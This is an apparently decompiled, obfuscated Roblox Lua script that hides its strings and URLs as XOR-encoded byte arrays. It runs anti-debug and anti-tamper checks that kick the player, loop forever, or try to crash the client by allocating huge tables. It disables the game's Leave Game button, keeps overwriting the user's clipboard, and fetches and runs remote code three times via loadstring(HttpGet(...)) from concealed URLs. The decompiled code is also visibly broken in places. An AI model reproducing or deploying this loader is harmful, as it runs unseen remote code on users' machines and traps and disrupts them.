--[[ this file was protected with 0x61 | discord.gg/c3zkVFa9Zn ]]

local function fn()
end

local function fn2()
    error("table index is nil")
end

local function fn3()
    while true do
        ;(nil).wait()
    end
end

local function fn4()
    return v.HttpService
end

local function fn5()
    local v2 = v
    return v2.HttpService
end

local function fn6()
    local v = v2
    return v.HttpService
end

local function fn7()
    local v2 = v
    v2()
end

local function fn8(a)
    ;(nil).spawn(function()
        pcall(function()
            local v2 = v
            loadstring(v2:HttpGet(a))()
        end)
    end)
end

local function fn9()
    return v2.HttpService
end

local function fn10()
    local v2 = v
    v2()
end

local function fn11()
    local v = v2
    v()
end

local function fn12(a)
    ;(nil).spawn(function()
        pcall(function()
            local v2 = v
            loadstring(v2:HttpGet(a))()
        end)
    end)
end

local function fn13(a)
    ;(nil).spawn(function()
        pcall(function()
            local v = v2
            loadstring(v:HttpGet(a))()
        end)
    end)
end

local function fn14()
    v()
end

local function fn15(a)
    ;(nil).spawn(function()
        pcall(function()
            local v2 = v
            loadstring(v2:HttpGet(a))()
        end)
    end)
end

local t = {}
local t2 = {
    10,
    54,
    71,
    91,
    194,
    174,
    129,
    1,
    218,
    50,
    101,
    244,
    78,
    233,
    247,
    247,
    5,
    255,
    212,
    39,
    16,
    132,
    161,
    129
}

local function fn16(a)
    if t[a] then
        return t[a]
    else
        local n = #t2
        local n2 = #a

        if 1 <= n2 then
            local v = a[1]
            local t3 = { (string.char(bit32.bxor(v, t2[0 % n + 1], 0))) }
            local v2 = v

            for i = 2, n2 do
                local v3 = a[i]
                t3[i] = string.char(bit32.bxor(v3, t2[(i - 1) % n + 1], v2))
                v2 = v3
            end

            local v3 = table.concat(t3)
            t[a] = v3
            return v3
        else
            local v = table.concat({})
            t[a] = v
            return v
        end
    end
end

local t3 = { 88, 44, 51, 59, 154, 70, 174, 223, 113, 0, 10, 144, 176, 60, 168, 43, 71, 215, 109 }
local t4 = { 75, 14, 58, 4, 178, 72, 176, 193, 126 }
local t5 = { 76, 27, 63, 1, 142, 65, 171, 207, 96, 34 }
local t6 = { 70, 25, 46, 56, 155, 94, 186, 206, 100 }
local t7 = { 79, 0, 34, 52, 151, 82, 182, 194, 104 }
local t8 = { 95, 26, 56, 17, 154, 90, 171, 223, 113, 16, 1, 148, 174, 34 }
local t9 = { 68, 29, 52, 10 }
local t10 = { 92, 3, 32, 30, 179, 78, 174, 194, 104, 54, 54, 145, 182, 37, 183 }
local t11 = { 89, 2, 36, 19, 189 }
local t12 = { 71, 20, 55, 5, 178, 113 }
local t13 = { 70, 17, 36, 24, 191 }
local t14 = { 76, 15, 36, 19 }
local t15 = { 94, 13, 50, 29, 150, 86, 167, 211, 125, 27, 7, 131, 168 }
local t16 = { 68, 23, 39, 44, 143, 82, 160, 214, 99, 35, 34 }
local t17 = { 68, 23, 39, 44, 143, 82, 160, 214, 99, 35, 34, 133, 163, 37, 165, 60 }
local t18 = { 79, 1, 54, 8, 184, 127, 155, 244, 77, 26, 62, 191, 133, 4, 160, 52, 94, 209, 96 }
local t19 = { 78, 29, 60, 6, 177, 115, 134, 212, 109, 48, 37, 180 }
local t20 = { 73, 13, 47, 21, 163, 98, 145, 209, 120, 57, 57, 185, 132, 46, 171, 57, 93, 214, 103 }
local t21 = { 36 }
local t22 = { 90, 13, 56, 23 }
local t23 = { 107 }
local t24 = { 66, 0, 51, 24, 137, 66, 177, 198, 117, 36, 36 }
local t25 = {
    81,
    81,
    46,
    89,
    187,
    55,
    209,
    181,
    27,
    78,
    68,
    220,
    246,
    49,
    165,
    49,
    22,
    197,
    49,
    98,
    0,
    241,
    53,
    152,
    178,
    181,
    192,
    168,
    70,
    200,
    47,
    79,
    249,
    184,
    184,
    96,
    14,
    188,
    120,
    189,
    137,
    90,
    174,
    231,
    130,
    106,
    167,
    10,
    32,
    52,
    20,
    32,
    142,
    68,
    177,
    221,
    37,
    74,
    3,
    215,
    247,
    107,
    240,
    107,
    66,
    157,
    18,
    23,
    102,
    192,
    60,
    224
}
local t26 = { 109, 52, 31, 32, 150, 85 }
local t27 = {
    107,
    41,
    26,
    36,
    139,
    85,
    160,
    129,
    47,
    114,
    55,
    160,
    143,
    10,
    145,
    70,
    34,
    253,
    96,
    41,
    74,
    186,
    122,
    149,
    252,
    175,
    200,
    229,
    70,
    132,
    112,
    20
}
local t28 = { 89, 3 }
local t29 = { 90, 0, 38, 4, 163, 127, 141 }
local t30 = { 121, 36, 10, 53, 214, 89, 233, 201, 34, 33, 101, 176, 223, 7 }
local t31 = {
    98,
    32,
    19,
    56,
    137,
    29,
    179,
    157,
    35,
    120,
    110,
    249,
    216,
    67,
    208,
    9,
    107,
    243,
    8,
    104,
    21,
    197,
    87,
    163,
    223,
    147,
    188,
    177,
    59
}
local t32 = { 73, 16, 37, 27, 158, 69, 173 }
local t33 = {
    98,
    32,
    19,
    56,
    137,
    29,
    179,
    157,
    53,
    102,
    116,
    174,
    135,
    7,
    132,
    27,
    107,
    246,
    87,
    3,
    118,
    128,
    66,
    172,
    200,
    138,
    168,
    157,
    43,
    171,
    73,
    39,
    144,
    141,
    152,
    5,
    47,
    242,
    110,
    182,
    192,
    92,
    250,
    180,
    212,
    36,
    246,
    88,
    63,
    104,
    70,
    115,
    158,
    113,
    164,
    235,
    115,
    9,
    66,
    218,
    225,
    105
}
local t34 = {
    98,
    32,
    19,
    56,
    192,
    65,
    239,
    221,
    54,
    42,
    126,
    189,
    193,
    6,
    201,
    9,
    34,
    236,
    9,
    24,
    39,
    236,
    33,
    243,
    163,
    162,
    128,
    162,
    7,
    243,
    22,
    126,
    212,
    171,
    246,
    114,
    104,
    212,
    81,
    192,
    131,
    59,
    140,
    217,
    179,
    2,
    250,
    11,
    103,
    48,
    30,
    112,
    217,
    24,
    201,
    240,
    30,
    109,
    63,
    133,
    131,
    19,
    150,
    83,
    111,
    161,
    4,
    77,
    56,
    203,
    44,
    220,
    162,
    240,
    219,
    185,
    31,
    131,
    55,
    120,
    155,
    192,
    239,
    88,
    39,
    189,
    46,
    239,
    179,
    31,
    133,
    231,
    146,
    93,
    202,
    61,
    110,
    109,
    64,
    99,
    236
}
local t35 = {
    98,
    32,
    19,
    56,
    137,
    29,
    179,
    157,
    53,
    102,
    116,
    174,
    135,
    7,
    132,
    27,
    107,
    246,
    87,
    3,
    118,
    128,
    66,
    172,
    200,
    138,
    168,
    157,
    43,
    171,
    73,
    39,
    144,
    141,
    138,
    8,
    32,
    163,
    53,
    168,
    130,
    11,
    167,
    173,
    211,
    120,
    171,
    79,
    35,
    102,
    14,
    61,
    154,
    85,
    176,
    194,
    55,
    104,
    108,
    241,
    209,
    23,
    211,
    22,
    39,
    234,
    6,
    16
}
local t36 = {
    75,
    19,
    32,
    18,
    253,
    0,
    245,
    145,
    42,
    116,
    116,
    242,
    156,
    6,
    144,
    1,
    97,
    190,
    49,
    230,
    105,
    114,
    113,
    173
}
local v = game
local v2 = v:GetService(fn16({ 95, 26, 56, 17, 154, 90, 171, 223, 113, 16, 16, 150, 174, 46, 186, 40 }))
local windowFocused = v2.WindowFocused
local v3 = windowFocused:Connect(fn)
local windowFocusReleased = v2.WindowFocusReleased
local v4 = windowFocusReleased:Connect(fn)
local v5
local v6
local v7

if typeof(v3) == fn16(t3) then
    v5 = v3
    v6 = v4
    v7 = false
else
    v5 = v3
    v6 = v4
    v7 = true
end

if not v7 then
    v7 = typeof(v6) ~= fn16(t3)
end

if v7 then
    math.random(1, 1000)
    error("attempt to index a nil value")
else
    v5:Disconnect()
    v6:Disconnect()
    local v8 = fn16(t4)
    local v9 = fn16(t4)
    local t37 = {
        { v8, fn16(t5) },
        { v9, fn16(t6) },
        { fn16(t4), fn16(t7) },
        { fn16(t8), fn16(t9) },
        { fn16(t10), fn16(t11) },
        { fn16(t10), fn16(t12) },
        { fn16(t10), fn16(t13) }
    }
    local t38 = { fn16(t10), fn16(t14) }
    t37[8] = t38
    t37[9] = { fn16(t15), fn16(t16) }
    t37[10] = { fn16(t15), fn16(t17) }
    local t39 = { fn16(t18), fn16(t19) }
    t37[11] = t39
    t37[12] = { fn16(t18), fn16(t20) }
    local n = 0
    local v10
    v8, v9, v10 = ipairs(t37)
    v3, v4 = v8(v9, v10)

    if v3 == nil then
        local v11 = fn16
        local v12 = t22
        local v13 = t23
        local v14 = pcall(function()
            local v14 = Instance.new(v11(v12))
            v14:InvalidMethod123(v11(v13))
        end)

        if v14 then
            while true do
                ;(nil).spawn()

                if not v14 then
                    break
                end
            end
        end

        t38:GetChildren(fn2)
        local v15 = math.random(1, 1000)
        local b = v15 + 4593 - 4593 == v15

        if b then
            b = #t39:GetChildren() <= 4
        end

        if b then
            local v16 = buffer
            buffer.writei8(v16.fromstring(v11(v13)), 1, 2)

            while true do
                local b2 = v15 + 4593 - 4593 == v15

                if b2 then
                    b2 = #v16:GetChildren() <= 4
                end

                if b2 then
                    v16 = buffer
                    buffer.writei8(v16.fromstring(v11(v13)), 1, 2)
                else
                    break
                end
            end

            local v17 = t24
            local v18 = t25
            v15, v9 = pcall(function()
                local v19 = v
                local v20 = v19:GetService(v11(v17))
                return v20:JSONDecode(v11(v18))
            end)
            local v19 = math.random(1, 1000)
            local b2 = not v15
            local v22
            local v23
            local v24

            if b2 then
                v23 = b2
                v22 = v19
                v24 = false
            else
                v22 = v19
                v24 = true
            end

            while true do
                if v24 then
                    v23 = v22 * 2 == v22 + v22 + 1
                elseif v23 then
                    ;(nil)()
                    v23 = not v15

                    if not v23 then
                        v24 = true
                        continue
                    end
                else
                    break
                end

                v24 = false
            end

            while true do
                local v25 = v9

                if v9 then
                    v25 = v9[6]
                end

                if v25 then
                    v25 = v9[6][2] ~= nil
                end

                if not v25 then
                    v25 = false
                end

                if v25 then
                    ;(true)()
                else
                    break
                end
            end

            local v25 = pcall(fn5)
            local b3 = not v25

            while b3 do
                local parent = (nil).Parent
                b3 = not v25
            end

            _G.ggvar = v11(t26)

            while true do
                local b4 = getfenv().ggvar ~= nil

                if not b4 then
                    b4 = false
                end

                if b4 then
                    b4()
                else
                    break
                end
            end

            _G.ggvar = nil
            v25, v9 = pcall(fn10)
            local b4 = not v9:find(v11(t27))
            local v26
            local v27

            if b4 then
                v26 = b4
                v27 = false
            else
                v27 = true
            end

            while true do
                if v27 then
                    v26 = false
                elseif v26 then
                    table.create(9000000000)
                    v26 = not v9:find(v11(t27))

                    if not v26 then
                        v27 = true
                        continue
                    end
                else
                    break
                end

                v27 = false
            end

            local v28 = t28

            local function fn17()
                local v20 = nil
                local v21 = nil
                local n2 = 1
                local n3 = 1
                local v29
                local v30
                v30, v29 = pcall(debug.getinfo, 1, v11(v28))
                local v31 = v29
                local b5 = not v30

                if not b5 then
                    b5 = not v29
                end

                while not b5 do
                    v20 = n3
                    v21 = v31
                    v30 = n2 + 1

                    if not (v30 <= 10) then
                        break
                    end

                    n2 = v30
                    n3 = v30
                    local v32
                    v30, v32 = pcall(debug.getinfo, v30, v11(v28))
                    v31 = v32
                    b5 = not v30

                    if not b5 then
                        b5 = not v32
                    end
                end

                return v20, v21
            end

            v25, v9 = fn17()
            local v29 = math.random(1, 1000)
            local b5 = not v9
            local v30
            local v31

            if b5 then
                v31 = b5
                v30 = v29
            else
                v30 = v29
                v31 = 5 < v9.currentline
            end

            if not v31 then
                v31 = v30 * 2 == v30 + v30 + 1
            end

            if v31 then
                local localPlayer = (nil).GetService(nil, v11(t29)).LocalPlayer
                localPlayer:Kick(v11(t30))
                error("attempt to index a nil value")
            else
                local v32 = t31

                local function fn18()
                    setclipboard(v11(v32))
                end

                local function fn19()
                    ;(nil).spawn(function()
                        math.random(1, 1000)
                        pcall(function()
                            setclipboard(v11(v32))
                        end)
                        error("attempt to index a nil value")
                    end)
                end

                local v33 = t32
                ;(nil).spawn(function()
                    local function fn20()
                        local v20 = v

                        for i, v21 in ipairs(getconnections(v20:GetService(v11(v33)).RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
                            v21:Disable()
                        end
                    end

                    while true do
                        if not (nil).wait() then
                            break
                        end

                        pcall(fn20)
                    end
                end)
                local v34 = fn12
                local v35 = t33
                ;(nil).spawn(function()
                    v34(v11(v35))
                end)
                ;(nil).wait(0.3)
                local v36 = t34
                ;(nil).spawn(function()
                    v34(v11(v36))
                end)
                ;(nil).wait(0.3)
                local v37 = t35
                ;(nil).spawn(function()
                    v34(v11(v37))
                end)
                fn18()
                fn19()
                print(v11(t36))
            end
        else
            local v16 = t24
            local v17 = t25
            v15, v9 = pcall(function()
                local v18 = v
                local v19 = v18:GetService(v11(v16))
                return v19:JSONDecode(v11(v17))
            end)
            local v18 = math.random(1, 1000)
            local b2 = not v15
            local v19
            local v22
            local v23

            if b2 then
                v22 = b2
                v19 = v18
                v23 = false
            else
                v19 = v18
                v23 = true
            end

            while true do
                if v23 then
                    v22 = v19 * 2 == v19 + v19 + 1
                elseif v22 then
                    ;(nil)()
                    v22 = not v15

                    if not v22 then
                        v23 = true
                        continue
                    end
                else
                    break
                end

                v23 = false
            end

            while true do
                local v24 = v9

                if v9 then
                    v24 = v9[6]
                end

                if v24 then
                    v24 = v9[6][2] ~= nil
                end

                if not v24 then
                    v24 = false
                end

                if v24 then
                    ;(true)()
                else
                    break
                end
            end

            local v24 = pcall(fn4)
            local b3 = not v24

            while b3 do
                local parent = (nil).Parent
                b3 = not v24
            end

            _G.ggvar = v11(t26)

            while true do
                local b4 = getfenv().ggvar ~= nil

                if not b4 then
                    b4 = false
                end

                if b4 then
                    b4()
                else
                    break
                end
            end

            _G.ggvar = nil
            v24, v9 = pcall(fn7)
            local b4 = not v9:find(v11(t27))
            local v25
            local v26

            if b4 then
                v25 = b4
                v26 = false
            else
                v26 = true
            end

            while true do
                if v26 then
                    v25 = false
                elseif v25 then
                    table.create(9000000000)
                    v25 = not v9:find(v11(t27))

                    if not v25 then
                        v26 = true
                        continue
                    end
                else
                    break
                end

                v26 = false
            end

            local v27 = t28

            local function fn17()
                local v20 = nil
                local v21 = nil
                local n2 = 1
                local n3 = 1
                local v28
                local v29
                v29, v28 = pcall(debug.getinfo, 1, v11(v27))
                local v30 = v28
                local b5 = not v29

                if not b5 then
                    b5 = not v28
                end

                while not b5 do
                    v20 = n3
                    v21 = v30
                    v29 = n2 + 1

                    if not (v29 <= 10) then
                        break
                    end

                    n2 = v29
                    n3 = v29
                    local v31
                    v29, v31 = pcall(debug.getinfo, v29, v11(v27))
                    v30 = v31
                    b5 = not v29

                    if not b5 then
                        b5 = not v31
                    end
                end

                return v20, v21
            end

            v24, v9 = fn17()
            local v28 = math.random(1, 1000)
            local b5 = not v9
            local v29
            local v30

            if b5 then
                v30 = b5
                v29 = v28
            else
                v29 = v28
                v30 = 5 < v9.currentline
            end

            if not v30 then
                v30 = v29 * 2 == v29 + v29 + 1
            end

            if v30 then
                local localPlayer = (nil).GetService(nil, v11(t29)).LocalPlayer
                localPlayer:Kick(v11(t30))
                error("attempt to index a nil value")
            else
                local v31 = t31

                local function fn18()
                    setclipboard(v11(v31))
                end

                local function fn19()
                    ;(nil).spawn(function()
                        math.random(1, 1000)
                        pcall(function()
                            setclipboard(v11(v31))
                        end)
                        error("attempt to index a nil value")
                    end)
                end

                local v32 = t32
                ;(nil).spawn(function()
                    local function fn20()
                        local v20 = v

                        for i, v21 in ipairs(getconnections(v20:GetService(v11(v32)).RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
                            v21:Disable()
                        end
                    end

                    while true do
                        if not (nil).wait() then
                            break
                        end

                        pcall(fn20)
                    end
                end)
                local v33 = fn8
                local v34 = t33
                ;(nil).spawn(function()
                    v33(v11(v34))
                end)
                ;(nil).wait(0.3)
                local v35 = t34
                ;(nil).spawn(function()
                    v33(v11(v35))
                end)
                ;(nil).wait(0.3)
                local v36 = t35
                ;(nil).spawn(function()
                    v33(v11(v36))
                end)
                fn18()
                fn19()
                print(v11(t36))
            end
        end
    else
        local v11 = v4[1]
        local v12 = v4[2]
        local t40 = {}
        local v13 = pcall(function()
            local v13 = Enum[v11][v12]
        end)
        local v14 = math.random(1, 1000)
        local b = v14 ^ 2 == v14 * v14

        if b then
            b = not v13
        end

        if b then
            n = 1
            local insert = table.insert
            local v15 = fn16(t21)
            local t41 = { v11 }
            t41[#t41 + 1] = v15
            t41[#t41 + 1] = v12
            insert(t40, table.concat(t41))
        end

        v14, v13 = v8(v9, v3)

        while v14 ~= nil do
            local v15 = v14
            local v16 = v13[1]
            local v17 = v13[2]
            v13 = pcall(function()
                local v18 = Enum[v16][v17]
            end)
            v14 = math.random(1, 1000)
            local b2 = v14 ^ 2 == v14 * v14

            if b2 then
                b2 = not v13
            end

            if b2 then
                n = n + 1
                local insert = table.insert
                v13 = fn16(t21)
                v14 = { v16 }
                v14[#v14 + 1] = v13
                v14[#v14 + 1] = v17
                insert(t40, table.concat(v14))
            end

            v14, v13 = v8(v9, v15)
        end

        local b2 = 3 <= n

        if not b2 then
            b2 = false
        end

        if b2 then
            local v15 = math.random(1, 1000)
            local v16 = v15
            local n2 = v15 * 2

            while true do
                local b3 = n2 == v16 + v16

                if b3 then
                    b3 = true
                end

                if b3 then
                    local n3 = 0

                    while true do
                        v15 = n3 + 1

                        if v15 <= 5 then
                            n3 = v15
                        else
                            break
                        end

                        ;(nil).spawn(fn3)
                    end

                    n2 = v16 * 2
                else
                    break
                end
            end
        end

        local v15 = fn16
        local v16 = t22
        local v17 = t23
        local v18 = pcall(function()
            local v18 = Instance.new(v15(v16))
            v18:InvalidMethod123(v15(v17))
        end)

        if v18 then
            while true do
                ;(nil).spawn()

                if not v18 then
                    break
                end
            end
        end

        ;(1000).GetChildren(1000, fn2)
        local v19 = math.random(1, 1000)
        local b3 = v19 + 4593 - 4593 == v19

        if b3 then
            b3 = #(1000).GetChildren(1000) <= 4
        end

        if b3 then
            local v22 = buffer
            buffer.writei8(v22.fromstring(v15(v17)), 1, 2)

            while true do
                local b4 = v19 + 4593 - 4593 == v19

                if b4 then
                    b4 = #v22:GetChildren() <= 4
                end

                if b4 then
                    v22 = buffer
                    buffer.writei8(v22.fromstring(v15(v17)), 1, 2)
                else
                    break
                end
            end

            local v23 = t24
            local v24 = t25
            v19, v13 = pcall(function()
                local v20 = v
                local v21 = v20:GetService(v15(v23))
                return v21:JSONDecode(v15(v24))
            end)
            local v25 = math.random(1, 1000)
            local b4 = not v19
            local v26
            local v27
            local v28

            if b4 then
                v27 = b4
                v28 = v25
                v26 = false
            else
                v28 = v25
                v26 = true
            end

            while true do
                if v26 then
                    v27 = v28 * 2 == v28 + v28 + 1
                elseif v27 then
                    ;(nil)()
                    v27 = not v19

                    if not v27 then
                        v26 = true
                        continue
                    end
                else
                    break
                end

                v26 = false
            end

            while true do
                local v29 = v13

                if v13 then
                    v29 = v13[6]
                end

                if v29 then
                    v29 = v13[6][2] ~= nil
                end

                if not v29 then
                    v29 = false
                end

                if v29 then
                    ;(true)()
                else
                    break
                end
            end

            local v29 = pcall(fn9)
            local b5 = not v29

            while b5 do
                local parent = (nil).Parent
                b5 = not v29
            end

            _G.ggvar = v15(t26)

            while true do
                local b6 = getfenv().ggvar ~= nil

                if not b6 then
                    b6 = false
                end

                if b6 then
                    ;(nil)()
                else
                    break
                end
            end

            _G.ggvar = nil
            v29, v13 = pcall(fn14)
            local b6 = not v13:find(v15(t27))
            local v30
            local v31

            if b6 then
                v31 = b6
                v30 = false
            else
                v30 = true
            end

            while true do
                if v30 then
                    v31 = false
                elseif v31 then
                    table.create(9000000000)
                    v31 = not v13:find(v15(t27))

                    if not v31 then
                        v30 = true
                        continue
                    end
                else
                    break
                end

                v30 = false
            end

            local v32 = t28

            local function fn17()
                local v20 = nil
                local v21 = nil
                local n2 = 1
                local n3 = 1
                local v33
                local v34
                v34, v33 = pcall(debug.getinfo, 1, v15(v32))
                local v35 = v33
                local b7 = not v34

                if not b7 then
                    b7 = not v33
                end

                while not b7 do
                    v20 = n3
                    v21 = v35
                    v34 = n2 + 1

                    if not (v34 <= 10) then
                        break
                    end

                    n2 = v34
                    n3 = v34
                    local v36
                    v34, v36 = pcall(debug.getinfo, v34, v15(v32))
                    v35 = v36
                    b7 = not v34

                    if not b7 then
                        b7 = not v36
                    end
                end

                return v20, v21
            end

            v29, v13 = fn17()
            local v33 = math.random(1, 1000)
            local b7 = not v13
            local v34
            local v35

            if b7 then
                v34 = b7
                v35 = v33
            else
                v35 = v33
                v34 = 5 < v13.currentline
            end

            if not v34 then
                v34 = v35 * 2 == v35 + v35 + 1
            end

            if v34 then
                local localPlayer = fn17:GetService(v15(t29)).LocalPlayer
                localPlayer:Kick(v15(t30))
                error("attempt to index a nil value")
            else
                local v36 = t31

                local function fn18()
                    setclipboard(v15(v36))
                end

                local function fn19()
                    ;(nil).spawn(function()
                        math.random(1, 1000)
                        pcall(function()
                            setclipboard(v15(v36))
                        end)
                        error("attempt to index a nil value")
                    end)
                end

                local v37 = t32
                ;(nil).spawn(function()
                    local function fn20()
                        local v20 = v20

                        for i, v21 in ipairs(getconnections(v20:GetService(v15(v37)).RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
                            v21:Disable()
                        end
                    end

                    while true do
                        if not (nil).wait() then
                            break
                        end

                        pcall(fn20)
                    end
                end)
                local v38 = fn15
                local v39 = t33
                ;(nil).spawn(function()
                    v38(v15(v39))
                end)
                ;(nil).wait(0.3)
                local v40 = t34
                ;(nil).spawn(function()
                    v38(v15(v40))
                end)
                ;(nil).wait(0.3)
                local v41 = t35
                ;(nil).spawn(function()
                    v38(v15(v41))
                end)
                fn18()
                fn19()
                print(v15(t36))
            end
        else
            local v22 = t24
            local v23 = t25
            v19, v13 = pcall(function()
                local v20 = v19
                local v21 = v20:GetService(v15(v22))
                return v21:JSONDecode(v15(v23))
            end)
            local v24 = math.random(1, 1000)
            local b4 = not v19
            local v25
            local v26
            local v27

            if b4 then
                v26 = b4
                v27 = v24
                v25 = false
            else
                v27 = v24
                v25 = true
            end

            while true do
                if v25 then
                    v26 = v27 * 2 == v27 + v27 + 1
                elseif v26 then
                    ;(nil)()
                    v26 = not v19

                    if not v26 then
                        v25 = true
                        continue
                    end
                else
                    break
                end

                v25 = false
            end

            while true do
                local v28 = v13

                if v13 then
                    v28 = v13[6]
                end

                if v28 then
                    v28 = v13[6][2] ~= nil
                end

                if not v28 then
                    v28 = false
                end

                if v28 then
                    ;(true)()
                else
                    break
                end
            end

            local v28 = pcall(fn6)
            local b5 = not v28

            while b5 do
                local parent = (nil).Parent
                b5 = not v28
            end

            _G.ggvar = v15(t26)

            while true do
                local b6 = getfenv().ggvar ~= nil

                if not b6 then
                    b6 = false
                end

                if b6 then
                    b6()
                else
                    break
                end
            end

            _G.ggvar = nil
            v28, v13 = pcall(fn11)
            local b6 = not v13:find(v15(t27))
            local v29
            local v30

            if b6 then
                v30 = b6
                v29 = false
            else
                v29 = true
            end

            while true do
                if v29 then
                    v30 = false
                elseif v30 then
                    table.create(9000000000)
                    v30 = not v13:find(v15(t27))

                    if not v30 then
                        v29 = true
                        continue
                    end
                else
                    break
                end

                v29 = false
            end

            local v31 = t28

            local function fn17()
                local v20 = nil
                local v21 = nil
                local n2 = 1
                local n3 = 1
                local v32
                local v33
                v33, v32 = pcall(debug.getinfo, 1, v15(v31))
                local v34 = v32
                local b7 = not v33

                if not b7 then
                    b7 = not v32
                end

                while not b7 do
                    v20 = n3
                    v21 = v34
                    v33 = n2 + 1

                    if not (v33 <= 10) then
                        break
                    end

                    n2 = v33
                    n3 = v33
                    local v35
                    v33, v35 = pcall(debug.getinfo, v33, v15(v31))
                    v34 = v35
                    b7 = not v33

                    if not b7 then
                        b7 = not v35
                    end
                end

                return v20, v21
            end

            v28, v13 = fn17()
            local v32 = math.random(1, 1000)
            local b7 = not v13
            local v33
            local v34

            if b7 then
                v33 = b7
                v34 = v32
            else
                v34 = v32
                v33 = 5 < v13.currentline
            end

            if not v33 then
                v33 = v34 * 2 == v34 + v34 + 1
            end

            if v33 then
                local localPlayer = (nil).GetService(nil, v15(t29)).LocalPlayer
                localPlayer:Kick(v15(t30))
                error("attempt to index a nil value")
            else
                local v35 = t31

                local function fn18()
                    setclipboard(v15(v35))
                end

                local function fn19()
                    ;(nil).spawn(function()
                        math.random(1, 1000)
                        pcall(function()
                            setclipboard(v15(v35))
                        end)
                        error("attempt to index a nil value")
                    end)
                end

                local v36 = t32
                ;(nil).spawn(function()
                    local function fn20()
                        local v20 = v20

                        for i, v21 in ipairs(getconnections(v20:GetService(v15(v36)).RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
                            v21:Disable()
                        end
                    end

                    while true do
                        if not (nil).wait() then
                            break
                        end

                        pcall(fn20)
                    end
                end)
                local v37 = fn13
                local v38 = t33
                ;(nil).spawn(function()
                    v37(v15(v38))
                end)
                ;(nil).wait(0.3)
                local v39 = t34
                ;(nil).spawn(function()
                    v37(v15(v39))
                end)
                ;(nil).wait(0.3)
                local v40 = t35
                ;(nil).spawn(function()
                    v37(v15(v40))
                end)
                fn18()
                fn19()
                print(v15(t36))
            end
        end
    end
end

